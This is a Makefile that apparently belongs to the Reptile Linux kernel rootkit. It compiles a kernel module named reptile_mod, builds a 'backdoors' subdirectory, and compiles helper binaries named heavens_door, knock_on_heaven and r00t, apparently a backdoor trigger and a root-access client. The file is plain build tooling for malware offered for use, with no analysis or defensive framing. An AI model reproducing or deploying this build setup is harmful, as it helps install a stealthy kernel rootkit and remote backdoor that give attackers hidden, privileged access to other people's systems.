obj-m += reptile_mod.o
reptile-objs := reptile_mod.o

all:
	mkdir -p bin
	cd backdoors && make all
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	mv reptile_mod.ko ../build/reptile_mod
	gcc -Wall heavens_door.c -o heavens_door
	gcc -Wall r00t.c -o r00t
	gcc -Wall knock_on_heaven.c -o knock_on_heaven
	mv heavens_door knock_on_heaven r00t ../build
clean:
	cd backdoors && make clean
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
